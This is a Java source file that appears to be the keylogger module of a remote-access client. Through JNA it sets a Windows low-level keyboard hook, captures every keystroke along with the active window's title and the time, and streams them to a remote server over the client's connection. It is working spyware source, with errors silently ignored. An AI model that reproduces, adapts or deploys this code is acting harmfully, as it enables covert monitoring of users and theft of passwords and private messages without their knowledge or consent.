package client.features;

import client.ClientMain;
import client.connection.ID;
import client.utils.dll.LoadUser32;
import com.sun.jna.platform.win32.*;

import java.text.SimpleDateFormat;
import java.util.Date;

public class KeyBoardHooker extends Thread {
    public boolean run = false;
    public boolean listen = false;
    private WinUser.HHOOK hhk;

    private final WinUser.LowLevelKeyboardProc keyboardProc = new WinUser.LowLevelKeyboardProc() {
        @Override
        public WinDef.LRESULT callback(int nCode, WinDef.WPARAM wParam, WinUser.KBDLLHOOKSTRUCT event) {
            WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();;
            if ((wParam.intValue() >= 0x2f) && (wParam.intValue() <= 0x100)) {
                if ((event.flags & 0x01) == 0) {
                    if (!hwnd.equals(User32.INSTANCE.GetForegroundWindow())) {
                        SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
                        char[] lpString = new char[260];
                        hwnd = User32.INSTANCE.GetForegroundWindow();
                        User32.INSTANCE.GetWindowText(hwnd, lpString, 260);
                        String title = "\n" + "时间:" + format.format(new Date()) + " 标题:" + String.valueOf(lpString) + "\n";
                        if(listen){
                            try {
                                ClientMain.clientConnection.sendMessage(ID.KEYBOARD(), title);
                            } catch (Exception ignored) {}
                        }
                    }

                    String str = String.valueOf(Win32VK.fromValue(event.vkCode)).replace("VK_", "");
                    if (str.length() >= 2) {
                        if (event.vkCode == 0x0D) {
                            if(listen){
                                try {
                                    ClientMain.clientConnection.sendMessage(ID.KEYBOARD(), "\n");
                                } catch (Exception ignored) {}
                            }
                        } else {
                            if(listen){
                                try {
                                    ClientMain.clientConnection.sendMessage(ID.KEYBOARD(), "[" + str + "]");
                                } catch (Exception ignored) {}
                            }
                        }
                    } else {
                        if (LoadUser32.instance.GetKeyState(0x14).equals(new WinDef.SHORT(0))) {
                            if(listen){
                                try {
                                    ClientMain.clientConnection.sendMessage(ID.KEYBOARD(), str.toLowerCase());
                                } catch (Exception ignored) {}
                            }
                        } else {
                            if(listen){
                                try {
                                    ClientMain.clientConnection.sendMessage(ID.KEYBOARD(), str);
                                } catch (Exception ignored) {}
                            }
                        }
                    }
                }
            }
            return com.sun.jna.platform.win32.User32.INSTANCE.CallNextHookEx(hhk, nCode, wParam, null);
        }
    };


    @Override
    public void run() {
        while (run) {
            setHookOn();
        }
    }

    public void setHookOn() {
        WinDef.HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        hhk = com.sun.jna.platform.win32.User32.INSTANCE.SetWindowsHookEx(com.sun.jna.platform.win32.User32.WH_KEYBOARD_LL, keyboardProc, hMod, 0);
        this.setPriority(Thread.MAX_PRIORITY);
        int result;
        WinUser.MSG msg = new WinUser.MSG();
        while (run && (result = com.sun.jna.platform.win32.User32.INSTANCE.GetMessage(msg, null, 0, 0)) != 0) {
            if (result == -1) {
                setHookOff();
                break;
            } else {
                com.sun.jna.platform.win32.User32.INSTANCE.TranslateMessage(msg);
                com.sun.jna.platform.win32.User32.INSTANCE.DispatchMessage(msg);
            }
        }
    }

    public void setHookOff() {
        User32.INSTANCE.UnhookWindowsHookEx(hhk);
    }
}
